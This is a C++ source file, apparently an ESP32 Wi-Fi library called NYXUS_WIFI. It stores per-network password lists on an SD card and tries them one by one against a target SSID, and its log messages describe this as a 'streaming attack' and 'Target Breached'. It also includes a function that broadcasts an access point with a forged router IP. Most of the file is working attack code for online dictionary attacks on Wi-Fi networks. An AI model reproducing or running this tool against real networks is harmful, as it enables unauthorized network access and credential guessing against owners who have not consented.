         timestamp(); Serial.printf("[%sWIFI%s] Silicon safely released. Hardware off.\n", Color::GREEN, Color::RESET);
      } else {
         timestamp(); Serial.printf("[%sERROR%s] Fatal: Hardware lockup. Silicon release failed.\n", Color::RED, Color::RESET);
      }
   }
   if (SavePayloads && db_folder_for_ssid_pswd != "") DumpSSIDs(db_folder_for_ssid_pswd, true);
   if (SaveConnectionConfiguration && db_folder_for_connection_config != "") SaveConnectionConfig(db_folder_for_connection_config);
   if (verbose){
      timestamp(); Serial.printf("[%sWIFI%s] Erasing SRAM configurations...\n", Color::GREEN, Color::RESET);
   }
   Targets.clear();
   config = ConnectionConfig();
   if (verbose){
      timestamp(); Serial.printf("[%sINFO%s] Killing protocol completed.\n", Color::YELLOW, Color::RESET);
      Serial.println("===============================");
   }
}

inline void NYXUS_WIFI::ChangeConnectionConfig(const ConnectionConfig &conf){
   config = conf;
   if (verbose){
      timestamp(); Serial.printf("[%sINFO%s] changing the connection configuration...\n", Color::YELLOW, Color::RESET);
      Serial.println("====== Connection profile ======");
      displayConfig();
      Serial.println("================================");
   }
}

inline void NYXUS_WIFI::Add_SSID_PSWD(std::string_view SSID, std::string_view PSWD){
   NyxPayload new_payload;
   new_payload.fill('\0');
   memcpy(new_payload.data(), PSWD.data(), std::min(PSWD.length(), static_cast<size_t>(63)));
   TargetDictionary* target_dict = nullptr;
   for (auto& dict : Targets) {
      if (std::string_view(dict.ssid.data()) == SSID) {
         target_dict = &dict;
         break;
      }
   }
   if (!target_dict) {
      Targets.emplace_back(SSID);
      target_dict = &Targets.back();
   }
   auto it = std::lower_bound(target_dict->payloads.begin(), target_dict->payloads.end(), new_payload);
   if (it != target_dict->payloads.end() && *it == new_payload) {
      if (verbose) { timestamp(); Serial.printf("[%sINFO%s] Payload already exists!\n", Color::YELLOW, Color::RESET); }
   }
   else {
      target_dict->payloads.insert(it, new_payload);
      if (verbose) { timestamp(); Serial.printf("[%sINFO%s] Payload inserted successfully!\n", Color::YELLOW, Color::RESET); }
   }
}

inline void NYXUS_WIFI::Remove_SSID_PSWD(std::string_view SSID, std::string_view PSWD){
   NyxPayload target_payload;
   target_payload.fill('\0');
   memcpy(target_payload.data(), PSWD.data(), std::min(PSWD.length(), static_cast<size_t>(63)));
   for (auto& dict : Targets) {
      if (std::string_view(dict.ssid.data()) == SSID) {
         auto it = std::lower_bound(dict.payloads.begin(), dict.payloads.end(), target_payload);
         if (it != dict.payloads.end() && *it == target_payload) {
            dict.payloads.erase(it);
            if (verbose) { timestamp(); Serial.printf("[%sINFO%s] Payload removed successfully!\n", Color::YELLOW, Color::RESET); }
         }
         else {
            if (verbose) { timestamp(); Serial.printf("[%sINFO%s] Payload does not exist!\n", Color::YELLOW, Color::RESET); }
         }
         return;
      }
   }
}

inline void NYXUS_WIFI::Remove_SSID(std::string_view SSID){
   bool erased = false;
   for (auto it = Targets.begin(); it != Targets.end(); ++it) {
      if (std::string_view(it->ssid.data()) == SSID) {
         Targets.erase(it);
         erased = true;
         break;
      }
   }
   if (verbose){
      if (erased){
         timestamp(); Serial.printf("[%sINFO%s] SSID removed successfully!\n", Color::YELLOW, Color::RESET); 
      }
      else{
         timestamp(); Serial.printf("[%sINFO%s] SSID does not exist!\n", Color::YELLOW, Color::RESET);
      }
   }
}

inline void NYXUS_WIFI::LoadSSID(std::string_view SSID, std::string_view db_folder, bool showAtteptPswd, uint64_t limit) {
   if (!sd){
      if (verbose) { timestamp(); Serial.printf("[%sERROR%s] no mount detected\n", Color::RED, Color::RESET); }
      return;
   }
   std::string filepath = std::string(db_folder) + "/" + std::string(SSID) + ".ssidpswd";
   if (!sd->exists(filepath.c_str())) {
      if (verbose) { timestamp(); Serial.printf("[%sERROR%s] Database %s%s%s does not exist!\n", Color::RED, Color::RESET, Color::YELLOW, filepath.c_str(), Color::RESET); }
      return;
   }
   if (verbose) {
      timestamp(); Serial.printf("[%sINFO%s] Extracting payloads directly from %s...\n", Color::YELLOW, Color::RESET, filepath.c_str());
   }
   size_t initialSize = 0;
   for (const auto& dict : Targets) {
      if (std::string_view(dict.ssid.data()) == SSID) {
         initialSize = dict.payloads.size();
         break;
      }
   }
   FsFile file = sd->open(filepath.c_str(), O_READ);
   if (!file) return;
   char line[64];
   while (limit > 0 && file.fgets(line, sizeof(line)) > 0) {
      line[strcspn(line, "\r\n")] = 0;
      if (line[0] != '\0') {
         Add_SSID_PSWD(SSID, line); 
         limit--;
      }
   }
   file.close();
   if (verbose) {
      size_t finalSize = 0;
      for (const auto& dict : Targets) {
         if (std::string_view(dict.ssid.data()) == SSID) {
            finalSize = dict.payloads.size();
            break;
         }
      }
      size_t loaded = finalSize - initialSize;
      timestamp(); Serial.printf("[%sSUCCESS%s] %zu target payloads injected into SRAM.\n", Color::GREEN, Color::RESET, loaded);
   }
}

inline void NYXUS_WIFI::DumpSSID(std::string_view SSID, std::string_view db_folder, bool safeDump, uint64_t limit) {
   if (!sd){
      if (verbose) { timestamp(); Serial.printf("[%sERROR%s] no mount detected\n", Color::RED, Color::RESET); }
      return;
   }
   TargetDictionary* target_dict = nullptr;
   for (auto& dict : Targets) {
      if (std::string_view(dict.ssid.data()) == SSID) {
         target_dict = &dict;
         break;
      }
   }
   if (!target_dict) return;
   std::string filepath = std::string(db_folder) + "/" + std::string(SSID) + Extension::ssidpswd;
   if (verbose) { 
      timestamp(); Serial.printf("[%sINFO%s] Serializing target: %.*s\n", Color::YELLOW, Color::RESET, static_cast<int>(SSID.length()), SSID.data());
   }
   std::vector<bool> write_mask(target_dict->payloads.size(), true);
   if (safeDump && sd->exists(filepath.c_str())) {
      FsFile readFile = sd->open(filepath.c_str(), O_READ);
      if (readFile) {
         char line[64];
         NyxPayload search_payload;
         while (readFile.fgets(line, sizeof(line)) > 0) {
            line[strcspn(line, "\r\n")] = 0;
            if (line[0] == '\0') continue;
            search_payload.fill('\0');
            memcpy(search_payload.data(), line, std::min(strlen(line), (size_t)63));
            auto it = std::lower_bound(target_dict->payloads.begin(), target_dict->payloads.end(), search_payload);
            if (it != target_dict->payloads.end() && *it == search_payload) {
               size_t idx = std::distance(target_dict->payloads.begin(), it);
               write_mask[idx] = false;
            }
         }
         readFile.close();
      }
   }
   FsFile writeFile = sd->open(filepath.c_str(), (safeDump ? (O_WRITE | O_CREAT | O_AT_END) : (O_WRITE | O_CREAT | O_TRUNC)));
   if (!writeFile) {
      if (verbose) { timestamp(); Serial.printf("[%sERROR%s] I/O failure on file: %s\n", Color::RED, Color::RESET, filepath.c_str()); }
      return;
   }
   for (size_t i = 0; i < target_dict->payloads.size(); i++) {
      if (limit == 0) break;
      if (!safeDump || write_mask[i]) {
         writeFile.println(target_dict->payloads[i].data());
         limit--;
      }
   }
   writeFile.close();
}

inline void NYXUS_WIFI::Dump_Exact_SSID_PSWD(std::string_view SSID, std::string_view PSWD, std::string_view db_folder, bool safeDump) {
   if (!sd){
      if (verbose) {
         timestamp(); Serial.printf("[%sERROR%s] no mount detected\n", Color::RED, Color::RESET);
      }
      return;
   }
   std::string filepath = std::string(db_folder) + "/" + std::string(SSID) + ".ssidpswd";
   if (safeDump && sd->exists(filepath.c_str())) {
      FsFile readFile = sd->open(filepath.c_str(), O_READ);
      if (readFile) {
         char line[64];
         while (readFile.fgets(line, sizeof(line)) > 0) {
            line[strcspn(line, "\r\n")] = 0;
            if (std::string_view(line) == PSWD) {
               if (verbose) {
                  timestamp(); Serial.printf("[%sINFO%s] Exact payload already exists in %s\n", Color::YELLOW, Color::RESET, filepath.c_str());
               }
               readFile.close();
               return;
            }
         }
         readFile.close();
      }
   }
   FsFile writeFile = sd->open(filepath.c_str(), O_WRITE | O_CREAT | O_AT_END);
   if (writeFile) {
      writeFile.printf("%.*s\n", static_cast<int>(PSWD.length()), PSWD.data());
      writeFile.close();
      if (verbose) {
         timestamp(); Serial.printf("[%sSUCCESS%s] Exact payload appended to %s\n", Color::GREEN, Color::RESET, filepath.c_str());
      }
   }
}

inline void NYXUS_WIFI::Load_Exact_SSID_PSWD(std::string_view SSID, std::string_view PSWD, std::string_view db_folder) {
   if (!sd){
      if (verbose) {
         timestamp(); Serial.printf("[%sERROR%s] no mount detected\n", Color::RED, Color::RESET);
      }
      return;
   }
   std::string filepath = std::string(db_folder) + "/" + std::string(SSID) + ".ssidpswd";
   if (!sd->exists(filepath.c_str())) return;
   FsFile file = sd->open(filepath.c_str(), O_READ);
   if (!file) return;
   char line[64];
   while (file.fgets(line, sizeof(line)) > 0) {
      line[strcspn(line, "\r\n")] = 0; 
      if (std::string_view(line) == PSWD) {
         Add_SSID_PSWD(SSID, PSWD);
         break;
      }
   }
   file.close();
}

[[nodiscard]] inline bool NYXUS_WIFI::execute_hardware_handshake(std::string_view ssid, std::string_view pswd) {
   xEventGroupClearBits(wifi_event_group, WIFI_CONNECTED_BIT | WIFI_FAIL_BIT);
   current_retry_count = 0;
   wifi_config_t wifi_cfg = {};
   size_t ssid_len = std::min(ssid.length(), sizeof(wifi_cfg.sta.ssid) - 1);
   memcpy(wifi_cfg.sta.ssid, ssid.data(), ssid_len);
   if (!pswd.empty()) {
      size_t pswd_len = std::min(pswd.length(), sizeof(wifi_cfg.sta.password) - 1);
      memcpy(wifi_cfg.sta.password, pswd.data(), pswd_len);
   }
   wifi_cfg.sta.threshold.authmode = WIFI_AUTH_OPEN;
   esp_wifi_set_config(WIFI_IF_STA, &wifi_cfg);
   if (config.ip1 != 0U) {
      esp_netif_dhcpc_stop(sta_netif);
      esp_netif_ip_info_t ip_info;
      ip_info.ip.addr = static_cast<uint32_t>(config.ip1);
      ip_info.gw.addr = static_cast<uint32_t>(config.gateway);
      ip_info.netmask.addr = static_cast<uint32_t>(config.subnet);
      esp_netif_set_ip_info(sta_netif, &ip_info);
      esp_netif_dns_info_t dns_info;
      dns_info.ip.u_addr.ip4.addr = static_cast<uint32_t>(config.dns1);
      dns_info.ip.type = IPADDR_TYPE_V4;
      esp_netif_set_dns_info(sta_netif, ESP_NETIF_DNS_MAIN, &dns_info);
   } 
   else esp_netif_dhcpc_start(sta_netif);
   esp_wifi_disconnect();
   esp_wifi_connect();
   TickType_t start_ticks = xTaskGetTickCount();
   TickType_t wait_ticks = pdMS_TO_TICKS((config.connection_wait_time_ms * config.retry_amount) + 1000);
   EventBits_t bits = 0;
   while ((xTaskGetTickCount() - start_ticks) < wait_ticks) {
      bits = xEventGroupWaitBits(wifi_event_group, WIFI_CONNECTED_BIT | WIFI_FAIL_BIT, pdTRUE, pdFALSE, 0);
      if ((bits & (WIFI_CONNECTED_BIT | WIFI_FAIL_BIT)) != 0) break;
      if (ui_yield_callback) ui_yield_callback();
      vTaskDelay(pdMS_TO_TICKS(10));
   }
   return (bits & WIFI_CONNECTED_BIT) != 0;
}

inline void NYXUS_WIFI::Connect(bool showAtteptPswd){
   if (Targets.empty()){
      if (verbose){ timestamp(); Serial.printf("[%sERROR%s] No SSID available to connect to.\n", Color::RED, Color::RESET); }
      return;
   }
   esp_wifi_set_mode(WIFI_MODE_STA);
   for (const auto &target : Targets){
      if (verbose){ timestamp(); Serial.printf("[%sWIFI%s] Attempting to connect to %s%s%s\n", Color::GREEN, Color::RESET, Color::MAGENTA, target.ssid.data(), Color::RESET); }
      for (const auto &PSWD : target.payloads){
         if (verbose && showAtteptPswd){
            timestamp(); Serial.printf("[%sWIFI%s] Attempting to connect to %s%s%s with password %s%s%s\n", Color::GREEN, Color::RESET, Color::MAGENTA, target.ssid.data(), Color::RESET, Color::YELLOW, PSWD.data(), Color::RESET);
         }
         if (execute_hardware_handshake(target.ssid.data(), PSWD.data())) {
            if (verbose) display_info();
            return;
         }
      }
   }
}

inline void NYXUS_WIFI::Connect(std::string_view SSID, std::string_view PSWD, bool showAtteptPswd, bool save){
   esp_wifi_set_mode(WIFI_MODE_STA);
   if (verbose && showAtteptPswd){
      timestamp(); Serial.printf("[%sWIFI%s] Targeted injection on %s%.*s%s with payload %s%.*s%s\n", Color::GREEN, Color::RESET, Color::MAGENTA, static_cast<int>(SSID.length()), SSID.data(), Color::RESET, Color::YELLOW, static_cast<int>(PSWD.length()), PSWD.data(), Color::RESET);
   }
   if (execute_hardware_handshake(SSID.data(), PSWD.data())) {
      if (verbose) display_info();
      if (save) Add_SSID_PSWD(SSID, PSWD);
   }
   else {
      if (verbose){ timestamp(); Serial.printf("[%sFAILED%s] Authentication rejected.\n", Color::RED, Color::RESET); }
   }
}

inline void NYXUS_WIFI::Connect(std::string_view SSID, bool showAtteptPswd){
   TargetDictionary* target_dict = nullptr;
   for (auto& dict : Targets) {
      if (std::string_view(dict.ssid.data()) == SSID) {
         target_dict = &dict;
         break;
      }
   }
   if (!target_dict){
      if (verbose){ timestamp(); Serial.printf("[%sERROR%s] Target SSID is NOT registered in the payload dictionary.\n", Color::RED, Color::RESET); }
      return;
   }
   esp_wifi_set_mode(WIFI_MODE_STA);
   for (const auto &PSWD : target_dict->payloads){
      if (verbose && showAtteptPswd){
         timestamp(); Serial.printf("[%sWIFI%s] Injecting payload %s%s%s into %s%s%s\n", Color::GREEN, Color::RESET, Color::YELLOW, PSWD.data(), Color::RESET, Color::MAGENTA, target_dict->ssid.data(), Color::RESET);
      }
      if (execute_hardware_handshake(target_dict->ssid.data(), PSWD.data())) {
         if (verbose) display_info();
         return;
      }
   }
   if (verbose){ timestamp(); Serial.printf("[%sFAILED%s] Dictionary exhausted. Target remains secure.\n", Color::RED, Color::RESET); }
}

inline void NYXUS_WIFI::Connect(std::string_view SSID, std::string_view db_folder, bool showAtteptPswd) {
   if (!sd){
      if (verbose) { timestamp(); Serial.printf("[%sERROR%s] No mount detected.\n", Color::RED, Color::RESET); }
      return;
   }
   std::string filepath = std::string(db_folder) + "/" + std::string(SSID) + ".ssidpswd";
   FsFile file = sd->open(filepath.c_str(), O_READ);
   if (!file) {
      if (verbose) { timestamp(); Serial.printf("[%sERROR%s] No payload database found for target: %.*s\n", Color::RED, Color::RESET, static_cast<int>(SSID.length()), SSID.data()); }
      return;
   }
   if (verbose) {
      timestamp(); Serial.printf("[%sINFO%s] Database hit! Commencing streaming attack on %s%.*s%s...\n", Color::YELLOW, Color::RESET, Color::MAGENTA, static_cast<int>(SSID.length()), SSID.data(), Color::RESET);
   }
   esp_wifi_set_mode(WIFI_MODE_STA);
   char payloadBuffer[64];
   while (file.fgets(payloadBuffer, sizeof(payloadBuffer)) > 0) {
      payloadBuffer[strcspn(payloadBuffer, "\r\n")] = 0;
      if (payloadBuffer[0] == '\0') continue;
      if (verbose && showAtteptPswd) {
         timestamp(); Serial.printf("[%sWIFI%s] Streaming payload: %s%s%s\n", Color::GREEN, Color::RESET, Color::YELLOW, payloadBuffer, Color::RESET);
      }
      if (execute_hardware_handshake(SSID.data(), payloadBuffer)) {
         if (verbose) {
            Serial.println();
            timestamp(); Serial.printf("[%sCRITICAL SUCCESS%s] Target Breached. Payload verified: %s%s%s\n", Color::GREEN, Color::RESET, Color::YELLOW, payloadBuffer, Color::RESET);
            display_info();
         }
         file.close();
         return; 
      }
   }
   file.close();
   if (verbose) { timestamp(); Serial.printf("[%sFAILED%s] Payload database exhausted. Target %.*s remains secure.\n", Color::RED, Color::RESET, static_cast<int>(SSID.length()), SSID.data()); }
}

inline void NYXUS_WIFI::DumpSSIDs(std::string_view db_folder, bool safeDump){
   if (!sd){
      if (verbose) { timestamp(); Serial.printf("[%sERROR%s] no mount detected\n", Color::RED, Color::RESET); }
      return;
   }
   size_t fileCreated = 0;
   size_t fileWritten = 0;
   if (verbose){
      Serial.println("===============================");
      timestamp();Serial.printf("[%sINFO%s] Commencing payload serialization sequence...\n", Color::YELLOW, Color::RESET);
   }
   NyxPayload search_payload;
   for (const auto &target : Targets){
      if (verbose) {
         timestamp(); Serial.printf("[%sINFO%s] Processing target matrix: %s\n", Color::YELLOW, Color::RESET, target.ssid.data());
      }
      std::string filepath = std::string(db_folder) + "/" + target.ssid.data() + Extension::ssidpswd;
      if (safeDump){
         std::vector<bool> write_mask(target.payloads.size(), true);
         bool file_existed = sd->exists(filepath.c_str());
         if (!file_existed) fileCreated++;
         if (file_existed) {
            FsFile readFile = sd->open(filepath.c_str(), O_READ);
            if (readFile) {
               char line[64];
               while (readFile.fgets(line, sizeof(line)) > 0) {
                  line[strcspn(line, "\r\n")] = 0;
                  if (line[0] == '\0') continue;
                  search_payload.fill('\0');
                  memcpy(search_payload.data(), line, std::min(strlen(line), (size_t)63));
                  auto it = std::lower_bound(target.payloads.begin(), target.payloads.end(), search_payload);
                  if (it != target.payloads.end() && *it == search_payload) {
                     size_t idx = std::distance(target.payloads.begin(), it);
                     write_mask[idx] = false;
                  }
               }
               readFile.close();
            }
         }
         FsFile writeFile = sd->open(filepath.c_str(), O_WRITE | O_CREAT | O_AT_END);
         if (!writeFile){
            if (verbose) { timestamp();Serial.printf("[%sERROR%s] I/O failure on file: %s\n", Color::RED, Color::RESET, filepath.c_str()); }
            continue;
         }
         for (size_t i = 0; i < target.payloads.size(); i++) {
            if (write_mask[i]) {
               writeFile.println(target.payloads[i].data());
               fileWritten++;
            }
         }
         writeFile.close();
      }
      else {
         if (!sd->exists(filepath.c_str())) fileCreated++;
         FsFile file = sd->open(filepath.c_str(), O_WRITE | O_CREAT | O_TRUNC);
         if (!file){
            if (verbose){ timestamp(); Serial.printf("[%sERROR%s] Could not create file: %s\n", Color::RED, Color::RESET, filepath.c_str()); }
            continue;
         }
         for (const auto &PSWD : target.payloads){
            file.println(PSWD.data());
            fileWritten++;
         }
         file.close();
      }
   }
   if (verbose){
      timestamp(); Serial.printf("[%sSUCCESS%s] Serialization complete.\n", Color::GREEN, Color::RESET);
      timestamp(); Serial.printf("[%sSTAT%s] Targets Created: %zu\tPayloads Written: %zu\n", Color::CYAN, Color::RESET, fileCreated, fileWritten);
      Serial.println("===============================");
   }
}

inline void NYXUS_WIFI::LoadConnectionConfig(std::string_view path){
   if (!sd){
      if (verbose) { timestamp(); Serial.printf("[%sERROR%s] No mount detected.\n", Color::RED, Color::RESET); }
      return;
   }
   std::string safe_path(path);
   if (!sd->exists(safe_path.c_str())){
      if (verbose) { timestamp(); Serial.printf("[%sERROR%s] %s%.*s%s does not exist!\n", Color::RED, Color::RESET, Color::YELLOW, static_cast<int>(path.length()), path.data(), Color::RESET ); }
      return;
   }
   if (verbose) { timestamp(); Serial.printf("[%sINFO%s] Delegating %.*s to NYXUS_FILE_PARSER...\n", Color::YELLOW, Color::RESET, static_cast<int>(path.length()), path.data()); }
   NYXUS_FILE_PARSER::Parse(sd, safe_path, &config);
   if (verbose) {
      timestamp(); Serial.printf("[%sSUCCESS%s] Connection configuration injected into SRAM.\n", Color::GREEN, Color::RESET);
      displayConfig(); 
   }
}

inline void NYXUS_WIFI::SaveConnectionConfig(std::string_view path){
   if (!sd){
      if (verbose) { timestamp(); Serial.printf("[%sERROR%s] No mount detected.\n", Color::RED, Color::RESET); }
      return;
   }
   std::string safe_path(path);
   FsFile file = sd->open(safe_path.c_str(), O_WRITE | O_CREAT | O_TRUNC);
   if (!file){
      if (verbose){ timestamp(); Serial.printf("[%sERROR%s] I/O failure on file: %.*s\n", Color::RED, Color::RESET, static_cast<int>(path.length()), path.data()); }
      return;
   }
   char buf_ip[16], buf_gt[16], buf_sub[16], buf_d1[16], buf_d2[16];
   ipToStr(config.ip1, buf_ip, sizeof(buf_ip));
   ipToStr(config.gateway, buf_gt, sizeof(buf_gt));
   ipToStr(config.subnet, buf_sub, sizeof(buf_sub));
   ipToStr(config.dns1, buf_d1, sizeof(buf_d1));
   ipToStr(config.dns2, buf_d2, sizeof(buf_d2));
   file.printf("-w %lld\n", config.connection_wait_time_ms);
   file.printf("-i %s\n", buf_ip);
   file.printf("-g %s\n", buf_gt);
   file.printf("-s %s\n", buf_sub);
   file.printf("-d %s\n", buf_d1);
   file.printf("-D %s\n", buf_d2);
   file.printf("-r %d\n", config.retry_amount);
   file.close();
   if (verbose){
      timestamp(); Serial.printf("[%sSUCCESS%s] Connection configuration serialized to %.*s\n", Color::GREEN, Color::RESET, static_cast<int>(path.length()), path.data());
   }
}

inline void NYXUS_WIFI::ResetConnectionConfig(){
   config = ConnectionConfig{
      .connection_wait_time_ms = 200,
      .ip1 = ESP_IP4TOUINT32(0, 0, 0, 0),
      .gateway = ESP_IP4TOUINT32(0, 0, 0, 0),
      .subnet = ESP_IP4TOUINT32(0, 255, 255, 255),
      .dns1 = ESP_IP4TOUINT32(0, 0, 0, 0),
      .dns2 = ESP_IP4TOUINT32(0, 0, 0, 0),
      .retry_amount = 5
   };
   if (verbose){
      timestamp(); Serial.printf("[%sINFO%s] Connection configuration restored to factory baseline.\n", Color::YELLOW, Color::RESET);
   }
}

inline void NYXUS_WIFI::Remove_Exact_SSID_PSWD_From_SD(std::string_view SSID, std::string_view PSWD, std::string_view db_folder) {
   if (!sd) {
      if (verbose) { timestamp(); Serial.printf("[%sERROR%s] No mount detected.\n", Color::RED, Color::RESET); }
      return;
   }
   std::string filepath = std::string(db_folder) + "/" + std::string(SSID) + Extension::ssidpswd;
   std::string temppath = std::string(db_folder) + "/" + std::string(SSID) + ".tmp";
   if (!sd->exists(filepath.c_str())) {
      if (verbose) { timestamp(); Serial.printf("[%sERROR%s] Database %s does not exist.\n", Color::RED, Color::RESET, filepath.c_str()); }
      return;
   }
   FsFile readFile = sd->open(filepath.c_str(), O_READ);
   FsFile writeFile = sd->open(temppath.c_str(), O_WRITE | O_CREAT | O_TRUNC);
   if (!readFile || !writeFile) {
      if (verbose) { timestamp(); Serial.printf("[%sERROR%s] I/O Lockup during file swap.\n", Color::RED, Color::RESET); }
      return;
   }
   bool found = false;
   char line[64];
   while (readFile.fgets(line, sizeof(line)) > 0) {
      line[strcspn(line, "\r\n")] = 0;
      if (line[0] == '\0') continue;
      if (std::string_view(line) == PSWD) {
         found = true;
      } else {
         writeFile.println(line);
      }
   }
   readFile.close();
   writeFile.close();
   if (found) {
      sd->remove(filepath.c_str());
      sd->rename(temppath.c_str(), filepath.c_str());
      if (verbose) { timestamp(); Serial.printf("[%sSUCCESS%s] Payload surgically excised from SD: %s\n", Color::GREEN, Color::RESET, filepath.c_str()); }
   } else {
      sd->remove(temppath.c_str());
      if (verbose) { timestamp(); Serial.printf("[%sINFO%s] Payload not found in SD database.\n", Color::YELLOW, Color::RESET); }
   }
}

inline void NYXUS_WIFI::DestroyFile(std::string_view filepath) {
   if (!sd) {
      if (verbose) { timestamp(); Serial.printf("[%sERROR%s] No mount detected.\n", Color::RED, Color::RESET); }
      return;
   }
   if (sd->exists(filepath.data())) {
      if (sd->remove(filepath.data())) {
         if (verbose) { timestamp(); Serial.printf("[%sSUCCESS%s] File obliterated from disk: %.*s\n", Color::GREEN, Color::RESET, static_cast<int>(filepath.length()), filepath.data()); }
      }
      else {
         if (verbose) { timestamp(); Serial.printf("[%sERROR%s] SPI Bus lock prevented deletion of: %.*s\n", Color::RED, Color::RESET, static_cast<int>(filepath.length()), filepath.data()); }
      }
   }
   else {
      if (verbose) { timestamp(); Serial.printf("[%sINFO%s] Target file does not exist: %.*s\n", Color::YELLOW, Color::RESET, static_cast<int>(filepath.length()), filepath.data()); }
   }
}

inline void NYXUS_WIFI::Delete_SSID_Database(std::string_view SSID, std::string_view db_folder) {
   std::string filepath = std::string(db_folder) + "/" + std::string(SSID) + Extension::ssidpswd;
   if (verbose) { timestamp(); Serial.printf("[%sINFO%s] Initiating deletion of payload database: %s\n", Color::RED, Color::RESET, filepath.c_str()); }
   DestroyFile(filepath);
}

inline void NYXUS_WIFI::Delete_ConnectionConfig(std::string_view path) {
   std::string filepath = std::string(path) + Extension::connconf;
   if (verbose) { timestamp(); Serial.printf("[%sINFO%s] Initiating deletion of connection config: %s\n", Color::RED, Color::RESET, filepath.c_str()); }
   DestroyFile(filepath);
}

inline void NYXUS_WIFI::StageTarget(const char* ssid, const char* pswd) {
   wifi_config_t wifi_cfg = {};
   strncpy((char*)wifi_cfg.sta.ssid, ssid, sizeof(wifi_cfg.sta.ssid) - 1);
   if (pswd != nullptr && strlen(pswd) > 0) {
      strncpy((char*)wifi_cfg.sta.password, pswd, sizeof(wifi_cfg.sta.password) - 1);
      wifi_cfg.sta.threshold.authmode = WIFI_AUTH_WPA2_PSK;
   }
   else wifi_cfg.sta.threshold.authmode = WIFI_AUTH_OPEN;
   esp_err_t err = esp_wifi_set_config(WIFI_IF_STA, &wifi_cfg);
   if (verbose) {
      if (err == ESP_OK) {
         timestamp();
         Serial.printf("[%sWIFI%s] Target credentials staged for %s%s%s. Ready for execution.\n", Color::GREEN, Color::RESET, Color::MAGENTA, ssid, Color::RESET);
      }
      else {
         timestamp();
         Serial.printf("[%sERROR%s] Failed to stage target registers. Code: %d\n", Color::RED, Color::RESET, err);
      }
   }
}

inline void NYXUS_WIFI::HostNetwork(const char* ssid, const char* pswd, uint8_t channel, bool hidden, uint8_t max_connections, const ForgedIPConfig& ipconf) {
   wifi_mode_t currentMode;
   esp_wifi_get_mode(&currentMode);
   if (currentMode == WifiMode::off) {
      if (verbose){
         timestamp(); Serial.printf("[%sERROR%s] Wifi is off.\n", Color::RED, Color::RESET);
      }
      return;
   }
   if (currentMode != WifiMode::assertive && currentMode != WifiMode::passive) ChangeMode(WifiMode::assertive);
   wifi_config_t ap_config = {};
   strncpy((char*)ap_config.ap.ssid, ssid, sizeof(ap_config.ap.ssid) - 1);
   ap_config.ap.ssid_len = strlen(ssid);
   ap_config.ap.channel = channel;
   ap_config.ap.max_connection = max_connections;
   ap_config.ap.ssid_hidden = hidden ? 1 : 0;
   if (pswd == nullptr || strlen(pswd) == 0) ap_config.ap.authmode = WIFI_AUTH_OPEN;
   else {
      strncpy((char*)ap_config.ap.password, pswd, sizeof(ap_config.ap.password) - 1);
      ap_config.ap.authmode = WIFI_AUTH_WPA2_PSK;
   }
   esp_err_t err = esp_wifi_set_config(WIFI_IF_AP, &ap_config);
   if (ipconf.ip != 0) {
      esp_netif_t* ap_netif = esp_netif_get_handle_from_ifkey("WIFI_AP_DEF");
      if (ap_netif != nullptr) {
         esp_netif_dhcps_stop(ap_netif);
         esp_netif_ip_info_t info;
         info.ip.addr = ipconf.ip;
         info.gw.addr = ipconf.gateway;
         info.netmask.addr = ipconf.subnet;
         esp_err_t ip_err = esp_netif_set_ip_info(ap_netif, &info);
         esp_netif_dhcps_start(ap_netif);
         if (verbose && ip_err == ESP_OK) {
            char ip_str[16];
            esp_ip4addr_ntoa(&info.ip, ip_str, sizeof(ip_str));
            timestamp();
            Serial.printf("[%sNETWORK%s] Forged Router IP Applied: %s\n", Color::YELLOW, Color::RESET, ip_str);
         }
      }
   }
   if (verbose) {
      if (err == ESP_OK) {
         timestamp();
         Serial.printf("[%sWIFI%s] Access Point Broadcasting: %s%s%s (Ch: %d)\n", Color::GREEN, Color::RESET, Color::MAGENTA, ssid, Color::RESET, channel);
      }
      else {
         timestamp();
         Serial.printf("[%sERROR%s] Failed to configure Access Point. Code: %d\n", Color::RED, Color::RESET, err);
      }
   }
}

inline const char* NYXUS_WIFI::translateEncryption(const wifi_auth_mode_t &authMode) {
   switch (authMode) {
      case WIFI_AUTH_OPEN: return "OPEN";
      case WIFI_AUTH_WEP: return "WEP";
      case WIFI_AUTH_WPA_PSK: return "WPA_PSK";
      case WIFI_AUTH_WPA2_PSK: return "WPA2_PSK";
      case WIFI_AUTH_WPA_WPA2_PSK: return "WPA_WPA2_PSK";
      case WIFI_AUTH_WPA2_ENTERPRISE: return "WPA2_ENTERPRISE";
      case WIFI_AUTH_WPA3_PSK: return "WPA3_PSK";
      case WIFI_AUTH_WPA2_WPA3_PSK: return "WPA2_WPA3_PSK";
      case WIFI_AUTH_WAPI_PSK: return "WAPI_PSK";
      default: return "UNKNOWN";
   }
}

#endif